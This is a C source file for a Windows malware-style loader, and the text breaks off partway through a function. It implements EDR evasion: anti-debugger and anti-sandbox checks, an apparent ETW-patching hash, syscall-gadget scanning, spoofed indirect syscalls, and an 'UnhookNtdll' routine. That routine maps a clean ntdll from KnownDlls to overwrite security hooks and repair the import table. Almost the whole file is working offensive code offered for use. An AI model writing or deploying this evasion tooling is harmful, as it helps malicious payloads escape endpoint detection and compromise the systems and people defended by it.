#include "myloader.h"

#define HASH_EtwEventWriteFull 0x1069bb5eab142403

static BOOL GetTextSectionRange(PVOID moduleBase, PVOID* outBase, SIZE_T* outSize) {
    if (!moduleBase || !outBase || !outSize) return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.') {
            *outBase = (PBYTE)moduleBase + pSection[i].VirtualAddress;
            *outSize = pSection[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}
BOOL CheckEnvironment() {
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
        return FALSE;
    }
    if (pCurrentPeb->BeingDebugged == 1) return FALSE;
    if ((pCurrentPeb->NtGlobalFlag & 0x70) == 0x70) return FALSE;
    if (pCurrentPeb->NumberOfProcessors < 2) return FALSE;
    PVOID pHeap = pCurrentPeb->ProcessHeap;
    if (pHeap) {
        DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x70);
        DWORD heapForceFlags = *(DWORD*)((PBYTE)pHeap + 0x74);
        if (!(heapFlags & 0x2) || heapForceFlags != 0) {
            return FALSE;
        }
    }
    BYTE kdDebuggerEnabled = *(BYTE*)(0x7FFE02D4);
    if (kdDebuggerEnabled & 0x1 || kdDebuggerEnabled & 0x2) {
        return FALSE;
    }

    unsigned __int64 t1, t2;
    t1 = __rdtsc();
    GetTickCount(); 
    t2 = __rdtsc();
    if ((t2 - t1) > 100000) { 
        return FALSE;
    }

    return TRUE;
}

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif
#define PAGE_ALIGN_DOWN(x) ((ULONG_PTR)(x) & ~(PAGE_SIZE - 1))

PVOID FindSyscallGadgetInRange(PVOID pStart, PVOID pEnd) {
    PBYTE pCur = (PBYTE)pStart;
    while ((ULONG_PTR)pCur < (ULONG_PTR)pEnd - 3) {
        // 0F 05 C3 : syscall; ret
        if (pCur[0] == 0x0F && pCur[1] == 0x05 && pCur[2] == 0xC3) {
            return (PVOID)pCur;
        }
        pCur++;
    }
    return NULL;
}

static WCHAR VxToLowerW(WCHAR c) {
    if (c >= L'A' && c <= L'Z') return (WCHAR)(c + (L'a' - L'A'));
    return c;
}

static SIZE_T VxWcsLen(PCWSTR str) {
    SIZE_T len = 0;
    if (!str) return 0;
    while (str[len] != 0) len++;
    return len;
}

static BOOL VxWideEqualsInsensitive(PCWSTR left, SIZE_T leftLen, PCWSTR right, SIZE_T rightLen) {
    SIZE_T i = 0;
    if (!left || !right || leftLen != rightLen) return FALSE;
    for (i = 0; i < leftLen; i++) {
        if (VxToLowerW(left[i]) != VxToLowerW(right[i])) return FALSE;
    }
    return TRUE;
}

static PVOID GetLoadedModuleBaseByName(PCWSTR moduleName) {
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb ? pCurrentTeb->ProcessEnvironmentBlock : NULL;
    SIZE_T targetNameLen = VxWcsLen(moduleName);
    if (!pCurrentPeb || !pCurrentPeb->LoaderData || !moduleName || targetNameLen == 0) return NULL;

    PLIST_ENTRY listHead = &pCurrentPeb->LoaderData->InLoadOrderModuleList;
    for (PLIST_ENTRY entry = listHead->Flink; entry && entry != listHead; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        SIZE_T currentNameLen = module->BaseDllName.Length / sizeof(WCHAR);
        if (!module->BaseDllName.Buffer || currentNameLen == 0) continue;
        if (VxWideEqualsInsensitive(module->BaseDllName.Buffer, currentNameLen, moduleName, targetNameLen)) {
            return module->DllBase;
        }
    }

    return NULL;
}

static BOOL BuildKnownDllPath(PCWSTR dllName, PWCHAR output, SIZE_T outputCch) {
    static const WCHAR knownDllPrefix[] = L"\\KnownDlls\\";
    SIZE_T prefixLen = sizeof(knownDllPrefix) / sizeof(knownDllPrefix[0]) - 1;
    SIZE_T nameLen = VxWcsLen(dllName);
    SIZE_T i = 0;

    if (!dllName || !output || outputCch == 0) return FALSE;
    if (prefixLen + nameLen + 1 > outputCch) return FALSE;

    for (i = 0; i < prefixLen; i++) output[i] = knownDllPrefix[i];
    for (i = 0; i < nameLen; i++) output[prefixLen + i] = dllName[i];
    output[prefixLen + nameLen] = 0;
    return TRUE;
}

static SIZE_T GetSectionMappedSize(PIMAGE_SECTION_HEADER pSection) {
    if (!pSection) return 0;
    if (pSection->Misc.VirtualSize) return pSection->Misc.VirtualSize;
    return pSection->SizeOfRawData;
}

static BOOL ProtectAndCopyRange(PVX_TABLE pVxTable, PVOID pSyscallGadget, PVOID pDirtyStart, PVOID pCleanStart, SIZE_T size);

static BOOL GetImageNtHeaders(PVOID moduleBase, PIMAGE_NT_HEADERS* outNt, SIZE_T* outImageSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    if (!moduleBase || !outNt || pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    if (!pNt->OptionalHeader.SizeOfImage) return FALSE;

    *outNt = pNt;
    if (outImageSize) *outImageSize = pNt->OptionalHeader.SizeOfImage;
    return TRUE;
}

static PVOID RvaToPtrChecked(PVOID moduleBase, SIZE_T imageSize, DWORD rva, SIZE_T minSize) {
    if (!moduleBase || !imageSize || rva >= imageSize) return NULL;
    if (minSize > imageSize - rva) return NULL;
    return (PBYTE)moduleBase + rva;
}

static CHAR VxToLowerA(CHAR c) {
    if (c >= 'A' && c <= 'Z') return (CHAR)(c + ('a' - 'A'));
    return c;
}

static SIZE_T VxStrLenA(PCSTR str) {
    SIZE_T len = 0;
    if (!str) return 0;
    while (str[len] != 0) len++;
    return len;
}

static SIZE_T VxStrnLenA(PCSTR str, SIZE_T maxLen) {
    SIZE_T len = 0;
    if (!str) return 0;
    while (len < maxLen && str[len] != 0) len++;
    return len;
}

static BOOL EndsWithDllInsensitiveA(PCSTR str, SIZE_T len) {
    if (!str || len < 4) return FALSE;
    return VxToLowerA(str[len - 4]) == '.'
        && VxToLowerA(str[len - 3]) == 'd'
        && VxToLowerA(str[len - 2]) == 'l'
        && VxToLowerA(str[len - 1]) == 'l';
}

static BOOL BuildWideModuleNameFromAnsi(PCSTR moduleName, SIZE_T moduleNameLen, BOOL appendDllIfMissing, PWCHAR output, SIZE_T outputCch) {
    SIZE_T i = 0;
    SIZE_T finalLen = 0;
    BOOL hasDllSuffix = FALSE;

    if (!moduleName || !output || !outputCch) return FALSE;
    if (!moduleNameLen) moduleNameLen = VxStrLenA(moduleName);
    if (!moduleNameLen) return FALSE;

    hasDllSuffix = EndsWithDllInsensitiveA(moduleName, moduleNameLen);
    finalLen = moduleNameLen + ((appendDllIfMissing && !hasDllSuffix) ? 4 : 0);
    if (finalLen + 1 > outputCch) return FALSE;

    for (i = 0; i < moduleNameLen; i++) output[i] = (WCHAR)(BYTE)moduleName[i];
    if (appendDllIfMissing && !hasDllSuffix) {
        output[moduleNameLen + 0] = L'.';
        output[moduleNameLen + 1] = L'd';
        output[moduleNameLen + 2] = L'l';
        output[moduleNameLen + 3] = L'l';
    }
    output[finalLen] = 0;
    return TRUE;
}

static PVOID GetLoadedModuleBaseByNameA(PCSTR moduleName, SIZE_T moduleNameLen, BOOL appendDllIfMissing) {
    WCHAR moduleNameW[260] = { 0 };
    if (!BuildWideModuleNameFromAnsi(moduleName, moduleNameLen, appendDllIfMissing, moduleNameW, sizeof(moduleNameW) / sizeof(moduleNameW[0]))) {
        return NULL;
    }
    return GetLoadedModuleBaseByName(moduleNameW);
}

static PVOID ResolveExportByNameInternal(PVOID moduleBase, PCSTR functionName, DWORD depth);
static PVOID ResolveExportByOrdinalInternal(PVOID moduleBase, WORD ordinal, DWORD depth);

static PVOID ResolveForwardedExport(PCSTR forwarder, DWORD depth) {
    SIZE_T forwarderLen = 0;
    SIZE_T i = 0;
    SIZE_T moduleNameLen = 0;
    PCSTR procPart = NULL;
    PVOID forwardModuleBase = NULL;

    if (!forwarder || depth > 8) return NULL;

    forwarderLen = VxStrLenA(forwarder);
    if (!forwarderLen) return NULL;

    for (i = 0; i < forwarderLen; i++) {
        if (forwarder[i] == '.') break;
    }

    if (i == 0 || i >= forwarderLen - 1) return NULL;
    moduleNameLen = i;
    procPart = forwarder + i + 1;

    forwardModuleBase = GetLoadedModuleBaseByNameA(forwarder, moduleNameLen, TRUE);
    if (!forwardModuleBase) {
        forwardModuleBase = GetLoadedModuleBaseByNameA(forwarder, moduleNameLen, FALSE);
    }
    if (!forwardModuleBase) return NULL;

    if (procPart[0] == '#') {
        DWORD ordinalValue = 0;
        SIZE_T j = 1;
        if (procPart[j] == 0) return NULL;
        for (; procPart[j] != 0; j++) {
            if (procPart[j] < '0' || procPart[j] > '9') return NULL;
            ordinalValue = (ordinalValue * 10) + (DWORD)(procPart[j] - '0');
            if (ordinalValue > 0xFFFF) return NULL;
        }
        return ResolveExportByOrdinalInternal(forwardModuleBase, (WORD)ordinalValue, depth + 1);
    }

    return ResolveExportByNameInternal(forwardModuleBase, procPart, depth + 1);
}

static PVOID ResolveExportAddressByRva(PVOID moduleBase, PIMAGE_NT_HEADERS pNt, DWORD exportRva, DWORD exportSize, DWORD functionRva, DWORD depth) {
    SIZE_T imageSize = 0;
    if (!moduleBase || !pNt || !functionRva || depth > 8) return NULL;

    imageSize = pNt->OptionalHeader.SizeOfImage;
    if (!imageSize || functionRva >= imageSize) return NULL;

    if (exportRva && exportSize && functionRva >= exportRva && functionRva < exportRva + exportSize) {
        PCSTR forwarder = (PCSTR)((PBYTE)moduleBase + functionRva);
        SIZE_T maxForwardLen = imageSize - functionRva;
        if (VxStrnLenA(forwarder, maxForwardLen) >= maxForwardLen) return NULL;
        return ResolveForwardedExport(forwarder, depth + 1);
    }

    return (PBYTE)moduleBase + functionRva;
}

static PVOID ResolveExportByNameInternal(PVOID moduleBase, PCSTR functionName, DWORD depth) {
    PIMAGE_NT_HEADERS pNt = NULL;
    SIZE_T imageSize = 0;
    PIMAGE_DATA_DIRECTORY pExportDir = NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = NULL;
    PDWORD pFunctions = NULL;
    PDWORD pNames = NULL;
    PWORD pOrdinals = NULL;

    if (!moduleBase || !functionName || !functionName[0] || depth > 8) return NULL;
    if (!GetImageNtHeaders(moduleBase, &pNt, &imageSize)) return NULL;

    pExportDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!pExportDir->VirtualAddress || !pExportDir->Size) return NULL;

    pExport = (PIMAGE_EXPORT_DIRECTORY)RvaToPtrChecked(moduleBase, imageSize, pExportDir->VirtualAddress, sizeof(IMAGE_EXPORT_DIRECTORY));
    if (!pExport) return NULL;
    if (!pExport->NumberOfFunctions || pExport->NumberOfFunctions > (imageSize / sizeof(DWORD))) return NULL;
    if (!pExport->NumberOfNames || pExport->NumberOfNames > (imageSize / sizeof(DWORD))) return NULL;
    if (pExport->NumberOfNames > (imageSize / sizeof(WORD))) return NULL;

    pFunctions = (PDWORD)RvaToPtrChecked(moduleBase, imageSize, pExport->AddressOfFunctions, pExport->NumberOfFunctions * sizeof(DWORD));
    pNames = (PDWORD)RvaToPtrChecked(moduleBase, imageSize, pExport->AddressOfNames, pExport->NumberOfNames * sizeof(DWORD));
    pOrdinals = (PWORD)RvaToPtrChecked(moduleBase, imageSize, pExport->AddressOfNameOrdinals, pExport->NumberOfNames * sizeof(WORD));
    if (!pFunctions || !pNames || !pOrdinals) return NULL;

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        DWORD nameRva = pNames[i];
        DWORD functionRva = 0;
        WORD ordinalIndex = 0;
        PCSTR exportName = (PCSTR)RvaToPtrChecked(moduleBase, imageSize, nameRva, 1);

        if (!exportName) continue;
        if (VxStrnLenA(exportName, imageSize - nameRva) >= imageSize - nameRva) continue;
        if (strcmp(exportName, functionName) != 0) continue;

        ordinalIndex = pOrdinals[i];
        if (ordinalIndex >= pExport->NumberOfFunctions) return NULL;

        functionRva = pFunctions[ordinalIndex];
        return ResolveExportAddressByRva(moduleBase, pNt, pExportDir->VirtualAddress, pExportDir->Size, functionRva, depth);
    }

    return NULL;
}

static PVOID ResolveExportByOrdinalInternal(PVOID moduleBase, WORD ordinal, DWORD depth) {
    PIMAGE_NT_HEADERS pNt = NULL;
    SIZE_T imageSize = 0;
    PIMAGE_DATA_DIRECTORY pExportDir = NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = NULL;
    PDWORD pFunctions = NULL;
    DWORD ordinalIndex = 0;
    DWORD functionRva = 0;

    if (!moduleBase || !ordinal || depth > 8) return NULL;
    if (!GetImageNtHeaders(moduleBase, &pNt, &imageSize)) return NULL;

    pExportDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!pExportDir->VirtualAddress || !pExportDir->Size) return NULL;

    pExport = (PIMAGE_EXPORT_DIRECTORY)RvaToPtrChecked(moduleBase, imageSize, pExportDir->VirtualAddress, sizeof(IMAGE_EXPORT_DIRECTORY));
    if (!pExport) return NULL;
    if (!pExport->NumberOfFunctions || pExport->NumberOfFunctions > (imageSize / sizeof(DWORD))) return NULL;
    if (ordinal < pExport->Base) return NULL;

    ordinalIndex = ordinal - pExport->Base;
    if (ordinalIndex >= pExport->NumberOfFunctions) return NULL;

    pFunctions = (PDWORD)RvaToPtrChecked(moduleBase, imageSize, pExport->AddressOfFunctions, pExport->NumberOfFunctions * sizeof(DWORD));
    if (!pFunctions) return NULL;

    functionRva = pFunctions[ordinalIndex];
    return ResolveExportAddressByRva(moduleBase, pNt, pExportDir->VirtualAddress, pExportDir->Size, functionRva, depth);
}

static BOOL RestoreExportDirectory(PVX_TABLE pVxTable, PVOID pSyscallGadget, PVOID pTargetBase, PIMAGE_NT_HEADERS pTargetNt, SIZE_T targetImageSize, PVOID pCleanBase, PIMAGE_NT_HEADERS pCleanNt, SIZE_T cleanImageSize) {
    PIMAGE_DATA_DIRECTORY pTargetExportDir = NULL;
    PIMAGE_DATA_DIRECTORY pCleanExportDir = NULL;
    SIZE_T copySize = 0;
    PVOID pDirtyExport = NULL;
    PVOID pCleanExport = NULL;

    if (!pVxTable || !pSyscallGadget || !pTargetBase || !pTargetNt || !pCleanBase || !pCleanNt) return FALSE;

    pTargetExportDir = &pTargetNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    pCleanExportDir = &pCleanNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!pTargetExportDir->VirtualAddress || !pTargetExportDir->Size || !pCleanExportDir->VirtualAddress || !pCleanExportDir->Size) {
        return TRUE;
    }

    copySize = pTargetExportDir->Size;
    if (copySize > pCleanExportDir->Size) copySize = pCleanExportDir->Size;
    if (pTargetExportDir->VirtualAddress >= targetImageSize || pCleanExportDir->VirtualAddress >= cleanImageSize) return FALSE;
    if (copySize > targetImageSize - pTargetExportDir->VirtualAddress) copySize = targetImageSize - pTargetExportDir->VirtualAddress;
    if (copySize > cleanImageSize - pCleanExportDir->VirtualAddress) copySize = cleanImageSize - pCleanExportDir->VirtualAddress;
    if (!copySize) return TRUE;

    pDirtyExport = (PBYTE)pTargetBase + pTargetExportDir->VirtualAddress;
    pCleanExport = (PBYTE)pCleanBase + pCleanExportDir->VirtualAddress;
    return ProtectAndCopyRange(pVxTable, pSyscallGadget, pDirtyExport, pCleanExport, copySize);
}

static BOOL RestoreImportAddressTable(PVX_TABLE pVxTable, PVOID pSyscallGadget, PVOID pTargetBase, PIMAGE_NT_HEADERS pTargetNt, SIZE_T targetImageSize) {
    PIMAGE_DATA_DIRECTORY pImportDir = NULL;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;
    SIZE_T maxDescCount = 0;

    if (!pVxTable || !pSyscallGadget || !pTargetBase || !pTargetNt) return FALSE;

    pImportDir = &pTargetNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!pImportDir->VirtualAddress || !pImportDir->Size) return TRUE;
    if (pImportDir->VirtualAddress >= targetImageSize) return FALSE;

    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)RvaToPtrChecked(pTargetBase, targetImageSize, pImportDir->VirtualAddress, sizeof(IMAGE_IMPORT_DESCRIPTOR));
    if (!pImportDesc) return FALSE;

    maxDescCount = pImportDir->Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
    {
        SIZE_T imageBoundCount = (targetImageSize - pImportDir->VirtualAddress) / sizeof(IMAGE_IMPORT_DESCRIPTOR);
        if (!maxDescCount || maxDescCount > imageBoundCount) maxDescCount = imageBoundCount;
    }
    if (!maxDescCount) return TRUE;

    for (SIZE_T descIdx = 0; descIdx < maxDescCount; descIdx++) {
        PIMAGE_IMPORT_DESCRIPTOR pDesc = &pImportDesc[descIdx];
        PCSTR importedModuleName = NULL;
        PVOID importedModuleBase = NULL;
        PIMAGE_THUNK_DATA pFirstThunk = NULL;
        PIMAGE_THUNK_DATA pOriginalThunk = NULL;
        SIZE_T maxFirstThunkCount = 0;
        SIZE_T maxOriginalThunkCount = 0;
        SIZE_T maxThunkCount = 0;

        if (pDesc->Name == 0 && pDesc->FirstThunk == 0 && pDesc->OriginalFirstThunk == 0) break;
        if (!pDesc->Name || !pDesc->FirstThunk) continue;

        importedModuleName = (PCSTR)RvaToPtrChecked(pTargetBase, targetImageSize, pDesc->Name, 1);
        if (!importedModuleName) continue;
        if (VxStrnLenA(importedModuleName, targetImageSize - pDesc->Name) >= targetImageSize - pDesc->Name) continue;

        importedModuleBase = GetLoadedModuleBaseByNameA(importedModuleName, 0, FALSE);
        if (!importedModuleBase) importedModuleBase = GetLoadedModuleBaseByNameA(importedModuleName, 0, TRUE);
        if (!importedModuleBase) continue;

        pFirstThunk = (PIMAGE_THUNK_DATA)RvaToPtrChecked(pTargetBase, targetImageSize, pDesc->FirstThunk, sizeof(IMAGE_THUNK_DATA));
        if (!pFirstThunk) continue;

        if (pDesc->OriginalFirstThunk) {
            pOriginalThunk = (PIMAGE_THUNK_DATA)RvaToPtrChecked(pTargetBase, targetImageSize, pDesc->OriginalFirstThunk, sizeof(IMAGE_THUNK_DATA));
            if (!pOriginalThunk) continue;
        } else {
            pOriginalThunk = pFirstThunk;
        }

        maxFirstThunkCount = (targetImageSize - pDesc->FirstThunk) / sizeof(IMAGE_THUNK_DATA);
        if (pDesc->OriginalFirstThunk) {
            maxOriginalThunkCount = (targetImageSize - pDesc->OriginalFirstThunk) / sizeof(IMAGE_THUNK_DATA);
        } else {
            maxOriginalThunkCount = maxFirstThunkCount;
        }
        maxThunkCount = (maxFirstThunkCount < maxOriginalThunkCount) ? maxFirstThunkCount : maxOriginalThunkCount;
        if (!maxThunkCount) continue;

        for (SIZE_T thunkIdx = 0; thunkIdx < maxThunkCount; thunkIdx++) {
            ULONGLONG lookup = pOriginalThunk[thunkIdx].u1.AddressOfData;
            ULONGLONG currentFunc = pFirstThunk[thunkIdx].u1.Function;
            PVOID expectedFunc = NULL;

            if (!lookup && !currentFunc) break;

            if (lookup & IMAGE_ORDINAL_FLAG64) {
                expectedFunc = ResolveExportByOrdinalInternal(importedModuleBase, (WORD)(lookup & 0xFFFF), 0);
            } else {
                DWORD importByNameRva = (DWORD)lookup;
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)RvaToPtrChecked(pTargetBase, targetImageSize, importByNameRva, sizeof(WORD) + 1);
                if (!pImportByName) continue;
                if (VxStrnLenA((PCSTR)pImportByName->Name, targetImageSize - importByNameRva - sizeof(WORD)) >= targetImageSize - importByNameRva - sizeof(WORD)) {
                    continue;
                }
                expectedFunc = ResolveExportByNameInternal(importedModuleBase, (PCSTR)pImportByName->Name, 0);
            }

            if (expectedFunc && (ULONG_PTR)currentFunc != (ULONG_PTR)expectedFunc) {
                ULONG_PTR fixedFunc = (ULONG_PTR)expectedFunc;
                if (!ProtectAndCopyRange(pVxTable, pSyscallGadget, &pFirstThunk[thunkIdx].u1.Function, &fixedFunc, sizeof(fixedFunc))) {
                    return FALSE;
                }
            }
        }
    }

    return TRUE;
}

static PVOID FindSyscallGadgetInModule(PVOID moduleBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    if (!moduleBase || pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    if (!imageSize) return NULL;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        SIZE_T sectionSize = GetSectionMappedSize(&pSection[i]);
        ULONG_PTR sectionVA = pSection[i].VirtualAddress;
        if (!(pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        if (!sectionSize || sectionVA >= imageSize) continue;
        if (sectionVA + sectionSize > imageSize) {
            sectionSize = imageSize - sectionVA;
        }

        PVOID pStart = (PBYTE)moduleBase + sectionVA;
        PVOID pEnd = (PBYTE)pStart + sectionSize;
        PVOID pGadget = FindSyscallGadgetInRange(pStart, pEnd);
        if (pGadget) return pGadget;
    }

    return NULL;
}

static PVOID FindSyscallGadgetInModuleOutsideRange(PVOID moduleBase, ULONG_PTR excludeStart, ULONG_PTR excludeEnd) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    if (!moduleBase || pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    if (!imageSize) return NULL;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        SIZE_T sectionSize = GetSectionMappedSize(&pSection[i]);
        ULONG_PTR sectionVA = pSection[i].VirtualAddress;
        if (!(pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        if (!sectionSize || sectionVA >= imageSize) continue;
        if (sectionVA + sectionSize > imageSize) {
            sectionSize = imageSize - sectionVA;
        }
        if (!sectionSize) continue;

        ULONG_PTR sectionStart = (ULONG_PTR)moduleBase + sectionVA;
        ULONG_PTR sectionEnd = sectionStart + sectionSize;

        if (excludeStart < sectionEnd && excludeEnd > sectionStart) {
            if (excludeStart > sectionStart) {
                PVOID pGadget = FindSyscallGadgetInRange((PVOID)sectionStart, (PVOID)excludeStart);
                if (pGadget) return pGadget;
            }
            if (excludeEnd < sectionEnd) {
                PVOID pGadget = FindSyscallGadgetInRange((PVOID)excludeEnd, (PVOID)sectionEnd);
                if (pGadget) return pGadget;
            }
            continue;
        }

        PVOID pGadget = FindSyscallGadgetInRange((PVOID)sectionStart, (PVOID)sectionEnd);
        if (pGadget) return pGadget;
    }

    return NULL;
}

static BOOL ProtectAndCopyRange(PVX_TABLE pVxTable, PVOID pSyscallGadget, PVOID pDirtyStart, PVOID pCleanStart, SIZE_T size) {
    NTSTATUS status = 0;
    PVOID pProtectBase = pDirtyStart;
    SIZE_T sProtectSize = size;
    ULONG ulOldProtect = 0;

    if (!pVxTable || !pSyscallGadget || !pDirtyStart || !pCleanStart || !size) return FALSE;

    pVxTable->NtProtectVirtualMemory.pSyscallInst = pSyscallGadget;
    status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pProtectBase, &sProtectSize, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) return FALSE;

    VxMoveMemory(pDirtyStart, pCleanStart, size);
    status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pProtectBase, &sProtectSize, ulOldProtect, &ulOldProtect);
    if (!NT_SUCCESS(status)) return FALSE;

    return TRUE;
}

BOOL UnhookNtdll(PVX_TABLE pVxTable, PCWSTR wszDllName, PVOID pTargetModuleBase) {
    NTSTATUS status = 0;
    BOOL bSuccess = FALSE;
    BOOL bMapped = FALSE;
    BOOL bSyscallInstSwapped = FALSE;
    HANDLE hSection = NULL;
    PVOID pCleanDll = NULL;
    PVOID pOriginalSyscallInst = NULL;
    PVOID pTargetBase = NULL;
    SIZE_T viewSize = 0;
    WCHAR szKnownDllPath[128] = { 0 };
    PCWSTR pDllName = (wszDllName && wszDllName[0]) ? wszDllName : L"ntdll.dll";

    if (!pVxTable) return FALSE;
    pTargetBase = pTargetModuleBase ? pTargetModuleBase : GetLoadedModuleBaseByName(pDllName);
    if (!pTargetBase) return FALSE;
    if (!BuildKnownDllPath(pDllName, szKnownDllPath, sizeof(szKnownDllPath) / sizeof(szKnownDllPath[0]))) return FALSE;

    UNICODE_STRING usKnownDllPath;
    VxInitUnicodeString(&usKnownDllPath, szKnownDllPath);

    OBJECT_ATTRIBUTES objAttr = { 0 };
    InitializeObjectAttributes(&objAttr, &usKnownDllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = InvokeSpoofedSyscall(&pVxTable->NtOpenSection, 3, &hSection, SECTION_MAP_READ, &objAttr);
    if (!NT_SUCCESS(status)) goto Cleanup;

    status = InvokeSpoofedSyscall(&pVxTable->NtMapViewOfSection, 10,
        hSection, (HANDLE)-1, &pCleanDll, 0, 0, NULL, &viewSize, 2, 0, PAGE_READONLY);
    
    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection);
    hSection = NULL;
    if (!NT_SUCCESS(status)) goto Cleanup;
    bMapped = TRUE;

    PIMAGE_NT_HEADERS pCleanNt = NULL;
    PIMAGE_NT_HEADERS pTargetNt = NULL;
    SIZE_T cleanImageSize = 0;
    SIZE_T targetImageSize = 0;
    if (!GetImageNtHeaders(pCleanDll, &pCleanNt, &cleanImageSize)) goto Cleanup;
    if (!GetImageNtHeaders(pTargetBase, &pTargetNt, &targetImageSize)) goto Cleanup;

    PVOID pModuleGadget = FindSyscallGadgetInModule(pTargetBase);
    if (!pModuleGadget) {
        //ERR("[-]Unable to find syscall gadget in target module");
        goto Cleanup;
    }

    pOriginalSyscallInst = pVxTable->NtProtectVirtualMemory.pSyscallInst;
    pVxTable->NtProtectVirtualMemory.pSyscallInst = pModuleGadget;
    bSyscallInstSwapped = TRUE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pCleanNt);
    BOOL bFixedAnything = FALSE;
    for (WORD i = 0; i < pCleanNt->FileHeader.NumberOfSections; i++) {
        SIZE_T sectionSize = GetSectionMappedSize(&pSection[i]);
        ULONG_PTR sectionVA = pSection[i].VirtualAddress;
        BOOL isExec = ((pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0);

        if (!isExec) continue;
        if (!sectionSize || sectionVA >= cleanImageSize || sectionVA >= targetImageSize) continue;
        if (sectionVA + sectionSize > cleanImageSize) sectionSize = cleanImageSize - sectionVA;
        if (sectionVA + sectionSize > targetImageSize) sectionSize = targetImageSize - sectionVA;
        if (!sectionSize) continue;

        PVOID pDirtyStart = (PBYTE)pTargetBase + sectionVA;
        PVOID pCleanStart = (PBYTE)pCleanDll + sectionVA;
        ULONG_PTR dirtyStart = (ULONG_PTR)pDirtyStart;
        ULONG_PTR dirtyEnd = dirtyStart + sectionSize;
        ULONG_PTR splitPoint = PAGE_ALIGN_DOWN(dirtyStart + (sectionSize / 2));
        if (splitPoint <= dirtyStart || splitPoint >= dirtyEnd) {
            splitPoint = dirtyStart + (sectionSize / 2);
        }

        SIZE_T region1Size = 0;
        SIZE_T region2Size = 0;
        PVOID pRegion1Base = (PVOID)dirtyStart;
        PVOID pRegion2Base = (PVOID)splitPoint;
        PVOID pClean1Base = pCleanStart;
        PVOID pClean2Base = (PBYTE)pCleanStart + (splitPoint - dirtyStart);

        if (splitPoint > dirtyStart && splitPoint < dirtyEnd) {
            region1Size = splitPoint - dirtyStart;
            region2Size = dirtyEnd - splitPoint;
        }

        PVOID pGadgetInRegion1 = NULL;
        PVOID pGadgetInRegion2 = NULL;
        if (region1Size && region2Size) {
            pGadgetInRegion1 = FindSyscallGadgetInRange(pRegion1Base, (PBYTE)pRegion1Base + region1Size);
            pGadgetInRegion2 = FindSyscallGadgetInRange(pRegion2Base, (PBYTE)pRegion2Base + region2Size);
        }

        if (pGadgetInRegion1 && pGadgetInRegion2) {
            if (!ProtectAndCopyRange(pVxTable, pGadgetInRegion2, pRegion1Base, pClean1Base, region1Size)) {
                //ERR("[-]Protect/copy failed on exec section %u (region1)", i);
                goto Cleanup;
            }
